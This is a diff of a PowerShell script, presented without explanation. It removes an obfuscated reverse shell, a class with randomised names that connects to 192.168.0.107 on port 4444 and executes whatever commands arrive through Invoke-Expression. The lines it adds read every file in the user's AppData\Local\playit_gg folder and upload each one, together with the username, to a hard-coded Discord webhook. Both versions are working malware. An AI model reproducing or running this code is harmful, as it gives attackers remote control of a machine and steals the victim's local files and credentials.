@@ -1,99 +1,53 @@
-class FtStuRQQLFDleK {
-    
-    [string]$eztbwRL = "192.168.0.107"
-    [int]$QYLgfZdkeCFJ = 4444
-
-    $yZzZbVrLUdaBgB
-    $sQxDdRXiRshYposzSsEX
-    $TRuPOFirFVDOYDN
-    $vorHr
-    $ljJbHHzLF
-    $DDkBxapM
-    [int]$jrKxlnpwrYxJKejrPD = 50*1024
-
-    GrZhMJxZkgXicmi() {
-        $this.sQxDdRXiRshYposzSsEX = $false
-        while ($true) {
-            try {
-                $this.sQxDdRXiRshYposzSsEX = New-Object Net.Sockets.TcpClient($this.eztbwRL, $this.QYLgfZdkeCFJ)
-                break
-            } catch [System.Net.Sockets.SocketException] {
-                Start-Sleep -Seconds 5
-            }
-        }
-        $this.GHdepQEcuwVdgiyH()
-    }
-
-    GHdepQEcuwVdgiyH() {
-        $this.yZzZbVrLUdaBgB = $this.sQxDdRXiRshYposzSsEX.GetStream()
-        $this.vorHr = New-Object Byte[] $this.jrKxlnpwrYxJKejrPD
-        $this.DDkBxapM = New-Object Text.UTF8Encoding
-        $this.TRuPOFirFVDOYDN = New-Object IO.StreamWriter($this.yZzZbVrLUdaBgB, [Text.Encoding]::UTF8, $this.jrKxlnpwrYxJKejrPD)
-        $this.ljJbHHzLF = New-Object System.IO.StreamReader($this.yZzZbVrLUdaBgB)
-        $this.TRuPOFirFVDOYDN.AutoFlush = $true
-    }
-
-    sYGQlUn() {
-        $this.GrZhMJxZkgXicmi()
-        $this.ToahdTFQznyjL()
-    }
-
-    xpbDKpyqvp($TunOoFfNYp) {
+# Get the current user's username
+$username = $env:USERNAME
+# Construct the path
+$path = "C:\Users\$username\AppData\Local\playit_gg"
+# Check if the directory exists
+if (Test-Path -Path $path) {
+    # Get all files in the directory
+    $files = Get-ChildItem -Path $path
+    foreach ($file in $files) {
+        # Read the file content as bytes
+        $fileContent = [System.IO.File]::ReadAllBytes($file.FullName)
+        # Create a boundary for multipart/form-data
+        $boundary = [System.Guid]::NewGuid().ToString()
+        
+        # Prepare multipart form data with file and username
+        $formParts = @(
+            "--$boundary",
+            'Content-Disposition: form-data; name="file"; filename="' + $file.Name + '"',
+            "Content-Type: application/octet-stream`r`n",
+            [System.Text.Encoding]::ASCII.GetString($fileContent),
+            "--$boundary",
+            'Content-Disposition: form-data; name="username"',
+            "`r`n$username",
+            "--$boundary--"
+        )
+        
+        # Combine form parts
+        $formContent = $formParts -join "`r`n"
+        
+        # Create the HTTP request
+        $request = [System.Net.HttpWebRequest]::Create("https://discord.com/api/webhooks/1271841890274377809/iTW6zYB2qFb809-3SHLMy46Q2bv9ierSLaj8xgYk5r6b-NSdPqejC73R4cgMh9e3BVyr")
+        $request.Method = "POST"
+        $request.ContentType = "multipart/form-data; boundary=$boundary"
+        
+        # Write the form content to the request stream
+        $bytes = [System.Text.Encoding]::ASCII.GetBytes($formContent)
+        $request.ContentLength = $bytes.Length
+        $requestStream = $request.GetRequestStream()
+        $requestStream.Write($bytes, 0, $bytes.Length)
+        $requestStream.Close()
+        
+        # Send the request
         try {
-            [byte[]]$hMJBiPKCKNiWK = [text.Encoding]::Ascii.GetBytes($TunOoFfNYp)
-            $this.TRuPOFirFVDOYDN.Write($hMJBiPKCKNiWK, 0, $hMJBiPKCKNiWK.length)   
-        } catch [System.Management.Automation.MethodInvocationException] {
-            $this.sYGQlUn()
+            $response = $request.GetResponse()
+            Write-Host "File uploaded successfully: $($file.Name)"
+            $response.Close()
+        } catch {
+            Write-Error "Failed to upload file: $($_.Exception.Message)"
         }
     }
-
-    [string] xfnwppsKERkNfqJvAma() {
-        try {
-            $JHnzhYGGXnMruvqPZ = $this.yZzZbVrLUdaBgB.Read($this.vorHr, 0, $this.jrKxlnpwrYxJKejrPD)    
-            $TBTwoArRhSoqmhyHl = ($this.DDkBxapM.GetString($this.vorHr, 0, $JHnzhYGGXnMruvqPZ))
-            return $TBTwoArRhSoqmhyHl
-        } catch [System.Management.Automation.MethodInvocationException] {
-            $this.sYGQlUn()
-            return ""
-        }
-    }
-
-    [string] SOKvePCHThOB($TtfYtnrpQvEsyA) {
-        Write-Host $TtfYtnrpQvEsyA
-        try { 
-            $mypKfmmrHgk = Invoke-Expression $TtfYtnrpQvEsyA | Out-String
-        }
-        catch {
-            $iqwpunxtkNAGtbMAyqatfJL = $_.Exception
-            $kUVGknObKLJOZVvQM = $_.Message
-            $mypKfmmrHgk = "`n$_`n"
-        }
-        return $mypKfmmrHgk
-    }
-
-    [string] fHjGRZT() {
-        $HXpjRzQKLCluUvKtfSpd = [Environment]::UserName
-        $absHh = [System.Net.Dns]::GetHostName()
-        $OhVCKoKGB = Get-Location
-        return "$HXpjRzQKLCluUvKtfSpd@$absHh [$OhVCKoKGB]~$ "
-    }
-
-    ToahdTFQznyjL() {
-        while ($this.sQxDdRXiRshYposzSsEX.Connected) {
-            $this.xpbDKpyqvp($this.fHjGRZT())         
-            $TBTwoArRhSoqmhyHl = $this.xfnwppsKERkNfqJvAma()
-            $mypKfmmrHgk = "`n"
-            if ([string]::IsNullOrEmpty($TBTwoArRhSoqmhyHl)) {
-                continue
-            }
-            $mypKfmmrHgk = $this.SOKvePCHThOB($TBTwoArRhSoqmhyHl)
-            $this.xpbDKpyqvp($mypKfmmrHgk + "`n")
-            $this.yZzZbVrLUdaBgB.Flush()
-        }
-        $this.sQxDdRXiRshYposzSsEX.Close()
-        $this.sYGQlUn()
-    } 
+} else {
+    Write-Host "Directory not found: $path"
 }
-
-$UnZjsBnDlXM = [FtStuRQQLFDleK]::new()
-$UnZjsBnDlXM.sYGQlUn()
